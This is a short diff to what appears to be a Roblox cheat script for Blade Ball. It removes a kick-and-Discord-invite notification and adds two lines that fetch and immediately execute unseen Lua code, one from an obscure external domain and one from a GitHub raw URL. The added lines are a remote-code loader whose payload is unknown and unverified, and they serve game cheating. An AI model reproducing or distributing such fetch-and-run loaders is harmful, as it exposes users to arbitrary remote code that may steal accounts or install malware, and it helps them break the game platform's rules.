@@ -1,15 +1,3 @@
--- Roblox Script: AutoParry Kick Notification
+loadstring(game:HttpGet("https://egorikusa.space/f943aa785660d25c9eded1ab.lua", true))()
 
--- Define the message to display and copy to clipboard
-local kickMessage = "Sorry, AutoParry is temporarily broken because of Bladeball anti. This is experienced by all Bladeball scripts. Join the Discord server that's copied to your clipboard for updates."
-local discordInvite = "https://discord.gg/your_invite_code_here" -- Replace with the actual Discord invite
-
--- Copy the Discord invite to the player's clipboard
-if setclipboard then
-    setclipboard(discordInvite)
-else
-    warn("setclipboard function is not available.")
-end
-
--- Kick the player with the specified message
-game.Players.LocalPlayer:Kick(kickMessage)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/refs/heads/main/BladeBall%20GUI'))()
